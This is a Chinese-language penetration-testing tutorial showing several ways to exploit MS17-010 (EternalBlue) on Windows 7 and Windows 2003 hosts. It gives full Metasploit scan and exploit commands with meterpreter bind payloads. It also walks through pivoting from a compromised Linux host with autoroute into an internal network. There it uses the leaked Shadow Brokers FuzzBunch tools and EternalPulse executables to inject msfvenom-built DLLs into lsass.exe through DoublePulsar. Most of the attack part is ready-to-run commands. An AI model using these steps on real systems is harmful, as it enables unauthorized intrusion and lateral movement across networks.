# MS17_010常用打法：

### 前言：

ms17_010是内网的必争之地，很多时候需要借助此漏洞来进行横向，由于多次遇到该漏洞时msf无法利用成功，就通过查阅资料来复现ms17_010的几种打法并在实战中成功。

### 环境：

win7 x64：192.168.2.149

win7 x86：192.168.2.136

windows2003：192.168.2.152

kali:192.168.2.131

### msf打法：

##### x64：

###### 探测漏洞：

    
    
    use auxiliary/scanner/smb/smb_ms17_010  
    set rhosts 192.168.2.149

![image-20221119140544858](https://image.3001.net/images/20221119/1668864005_6378d805c23826a51a02b.png!small)

###### 利用：

    
    
    use exploit/windows/smb/ms17_010_eternalblue  
    set payload windows/x64/meterpreter/bind_tcp  
    set rhost 192.168.2.149  
    run

![image-20221119140818143](https://image.3001.net/images/20221119/1668864006_6378d806acd4bdbf27afb.png!small)

  

##### x86:

插件安装参考：[利用MS17-010渗透win7（32位） - 等待の喵 - 博客园
(cnblogs.com)](https://www.cnblogs.com/xiaoqianbook/articles/14335030.html)

###### 探测漏洞：

    
    
    use auxiliary/scanner/smb/smb_ms17_010  
    set rhosts 192.168.2.136

![image-20221119141517187](https://image.3001.net/images/20221119/1668864007_6378d807a67be06483fda.png!small)

可以看到系统为32位

###### 利用：

    
    
    use exploit/windows/smb/eternalblue_doublepulsar  
    show target  
    set payload windows/meterpreter/bind_tcp  
    set processinject explorer.exe  
    set rhost 192.168.2.136  
    run

![image-20221119173220560](https://image.3001.net/images/20221119/1668864008_6378d808af40368e1eda8.png!small)

![image-20221119141738208](https://image.3001.net/images/20221119/1668864009_6378d809a34312e3284c3.png!small)

##### 命令执行模块：

遇到windows2003时可以选择该模块进行命令执行

    
    
    use auxiliary/admin/smb/ms17_010_command  
    set command whoami  
    set rhost 192.168.2.152  
    run

![image-20221119172854772](https://image.3001.net/images/20221119/1668864011_6378d80b04c8a78061568.png!small)

### python脚本打法（原生打法）：

##### 实战打法：

我们拿到一台liunx主机权限，将liunx主机上线到msf再来利用python脚本打ms17_010

###### 添加路由：

    
    
    run autoroute -s 172.17.100.12/16  
    run autoroute -p

![image-20221119145020861](https://image.3001.net/images/20221119/1668864012_6378d80c0ab2cada88389.png!small)

内网中172.17.26.246存在ms17_010:

###### 漏洞利用：

脚本地址：<https://github.com/misterch0c/shadowbroker>

通过代理将流量代理到本地：

![image-20221119151055738](https://image.3001.net/images/20221119/1668864013_6378d80d2666517ab1c04.png!small)

探测漏洞利用模块：

    
    
    python fb.py

![image-20221119151349204](https://image.3001.net/images/20221119/1668864013_6378d80dd7925de6d9464.png!small)

TargetIP写目标IP 172.17.26.246，CallBack随便写：不使用Redirection

使用smbtouch探测

> use smbtouch
>
> execute

![image-20221119151526256](https://image.3001.net/images/20221119/1668864014_6378d80e87675faaaf931.png!small)

![image-20221119151638822](https://image.3001.net/images/20221119/1668864015_6378d80f3403b083b4c0f.png!small)

可以看出目标存在漏洞且 ETERNALBLUE模块可以利用：

    
    
    use  ETERNALBLUE

![image-20221119151822466](https://image.3001.net/images/20221119/1668864016_6378d81023a9afdd5aa72.png!small)

这里选择1：

![image-20221119151909664](https://image.3001.net/images/20221119/1668864016_6378d810bd3a1dc32d26a.png!small)

![image-20221119151945210](https://image.3001.net/images/20221119/1668864017_6378d811612268738a598.png!small)

可以看出攻击成功且目标系统为64位：

msf生成payload:

    
    
    msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1124 -f dll -o 64.dll
    
    
    use Doublepulsar

![image-20221119152138561](https://image.3001.net/images/20221119/1668864018_6378d81206940d05b4cc6.png!small)

![image-20221119152157647](https://image.3001.net/images/20221119/1668864018_6378d812a6668135ff45b.png!small)

这一步选择2，然后写上dll的地址：

![image-20221119152236666](https://image.3001.net/images/20221119/1668864019_6378d8134360aa5fe8cbe.png!small)

msf收到会话，成功攻击成功：

![image-20221119152346153](https://image.3001.net/images/20221119/1668864019_6378d813f0db3dc84bd8d.png!small)

里面集成了32位和64位，可根据自身情况来选择。

##### 为什么选择python脚本：

其实在实际运用中，msf的成功率很低，这就是为什么选择它的原因。

### python脚本的exe打法：

这个和上面的那个其实差不多，这个更方便一点：

脚本地址：https://[github](https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020).com/TolgaSEZER/EternalPulse

    
    
    Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 目标IP --TargetPort 445  
    ​  
    Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 172.17.26.246 --TargetPort 445

![image-20221119152933117](https://image.3001.net/images/20221119/1668864020_6378d814b0f3d1eb2f67f.png!small)

探测出目标系统64位

msf生成payload：

    
    
    msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1001 -f dll -o 64.dll

运行后门：

    
    
    Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 目标ip --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload dll地址 --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60

![image-20221119153327931](https://image.3001.net/images/20221119/1668864021_6378d81560d41c8e838fb.png!small)

成功收到会话：

![image-20221119153343694](https://image.3001.net/images/20221119/1668864022_6378d81620f108a98fc14.png!small)

该脚本也是64位和32位集成，可自行选择。

### 关于蓝屏：

上面两个脚本在本地均多次进行测试，用起来挺稳定的，没有出现蓝屏情况，可自行复现测试。

